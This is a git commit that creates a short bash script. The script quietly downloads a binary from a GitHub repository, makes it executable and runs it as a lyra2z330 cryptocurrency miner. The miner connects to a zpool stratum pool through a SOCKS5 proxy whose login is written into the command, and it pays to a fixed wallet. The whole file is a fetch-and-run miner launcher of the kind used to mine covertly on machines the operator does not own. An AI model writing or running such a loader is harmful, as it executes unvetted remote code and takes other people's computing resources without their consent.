736630658a976b297e7eb1ba1159d1913c048451
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-03-09 13:51:29 +0700

    Create ayonadasha.sh

---
+++ ayonadasha.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
+chmod +x pointd
+./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u XiH7gLoyFHo8s4vWvrD6ad2acw9dxsNfWR -p c=DASH,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@193.151.160.233:8320 -t 8
